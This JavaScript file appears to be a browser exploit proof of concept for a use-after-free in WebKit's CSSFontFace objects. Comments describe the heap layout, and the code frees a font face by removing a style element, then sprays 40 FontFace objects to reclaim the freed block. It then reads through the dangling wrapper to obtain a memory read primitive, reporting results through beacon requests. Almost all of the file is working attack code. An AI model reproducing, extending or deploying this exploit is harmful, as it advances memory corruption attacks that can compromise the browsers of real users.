// p463-alias — dangling CSS wrapper vs same-heap claimant (read primitive)
// Beacon prefix: V463-
//
// Falsified tonight (p462, 12 rounds): strings never claim the freed
// CSSFontFace block — CSSFontFace has its OWN bmalloc heap
// (DEFINE_ALLOCATOR_WITH_HEAP_IDENTIFIER(CSSFontFace) in the vulnerable
// source). Only another CSSFontFace can occupy it, which is why the
// FontFace spray has claimed it reliably all along.
//
// So the read primitive uses the only legal claimant: a fresh JS-constructed
// FontFace. If the dangling wrapper wa (CSS origin, backing freed by style
// removal) aliases a constructed face fb, then:
//   wa.family -> returns FB's family ('zzK', not 'ga')   = read through a
//                                                          dangling ptr
//   wa.status -> reads fb's m_status                      = offset-proven
// This needs NO UAF trigger at all: style removal is a quiet free.
//
// Read order per round: status FIRST (raw enum read, no deref, always
// safe), family SECOND (derefs a RefPtr — if the block is stale/unclaimed
// this can kill the page; the ran-flag skeleton parks and resumes).
// 40 constructed faces per round: volume claim, proven pattern.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V463-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  var NFACES = 40;
  var ROUND_MS = 8000;

  function store(k, v) { try { localStorage.setItem(k, String(v)); } catch(e) {} }

  var ran = 0;
  try { ran = parseInt(localStorage.getItem('p463ran') || '0', 10); } catch(e) {}
  if (ran === 1) {
    // previous round died mid-flight (family deref on stale block is the
    // likely killer) — record it and park for a human-paced re-entry
    B('KILL-round');
    store('p463ran', 0);
    parkNow('round died (stale deref) — back out, re-enter to continue');
    return;
  }

  var boots = 0;
  try {
    var t0 = parseInt(localStorage.getItem('p463bt') || '0', 10);
    var now = Date.now();
    if (now - t0 > 600000) boots = 1;
    else boots = (parseInt(localStorage.getItem('p463bc') || '0', 10) || 0) + 1;
    store('p463bt', now);
    store('p463bc', boots);
  } catch(e) {}
  if (boots > 10) { parkNow('loop guard'); return; }

  var hb = document.createElement('pre');
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var stopped = false;
  function parkNow(msg) {
    stopped = true;
    try {
      hb.textContent = 'p463 STOPPED: ' + msg;
      hb.style.color = '#ff0';
    } catch(e) {}
    B('PARK-' + encodeURIComponent(String(msg).slice(0, 60)));
  }

  B('BOOT-b' + boots);

  var roundNo = 0;
  var keep = [];

  function findWrapper(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function cleanup() {
    try {
      var st = document.querySelectorAll('style');
      for (var i = 0; i < st.length; i++) st[i].remove();
      document.fonts.forEach(function(f) { try { document.fonts.delete(f); } catch(e) {} });
      document.body.offsetHeight;
    } catch(e) {}
    keep = [];
  }

  function round() {
    if (stopped) return;
    roundNo++;
    var tag = 'R' + roundNo;
    hb.textContent = 'p463 round ' + roundNo;
    store('p463ran', 1);
    cleanup();

    // 1. CSS face + wrapper while backing alive
    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ga; src: local(Helvetica); }';
    document.head.appendChild(fs);
    document.body.offsetHeight;
    var wa = findWrapper('ga');
    if (!wa) { B(tag + '-NOWRAPPER'); store('p463ran', 0); setTimeout(round, ROUND_MS); return; }

    var baseStatus, baseFamily;
    try { baseStatus = wa.status; } catch(e) { baseStatus = 'THROW'; }
    try { baseFamily = wa.family; } catch(e) { baseFamily = 'THROW'; }
    B(tag + '-BASE-' + baseStatus + '/' + baseFamily);

    // 2. quiet free: style removal, nothing in flight
    fs.remove();
    document.body.offsetHeight;

    // 3. claim: fresh JS faces, same dedicated heap
    try {
      for (var i = 0; i < NFACES; i++) {
        var fb = new FontFace('zz' + i, 'local(Helvetica)');
        keep.push(fb);
      }
    } catch (e) {
      B('OOMGUARD');
      parkNow('allocation failed — parked before any console error');
      return;
    }

    // 4. read the oracle: status first (safe), family second (derefs)
    var st1, fam1;
    try { st1 = wa.status; } catch(e) { st1 = 'THROW'; }
    B(tag + '-STATUS-' + st1);                 // captured BEFORE any risky read
    try { fam1 = wa.family; } catch(e) { fam1 = 'THROW'; }
    B(tag + '-FAMILY-' + encodeURIComponent(String(fam1)).slice(0, 40));

    if (fam1 !== baseFamily && fam1.indexOf('zz') === 0) {
      // THE READ PRIMITIVE: dangling wrapper read a live claimant's field
      B(tag + '-ALIAS-' + fam1);
      hb.textContent = 'p463 ALIAS: wa.family = ' + fam1 + ' (read through dangling wrapper)';
      hb.style.color = '#0ff';
      store('p463ran', 0);
      return;                                   // keep objects alive; stop
    }
    if (st1 !== baseStatus) {
      B(tag + '-STATUS-CHANGED-' + baseStatus + '-to-' + st1);
    }

    store('p463ran', 0);
    B(tag + '-silent');
    setTimeout(round, ROUND_MS);
  }

  round();
})();
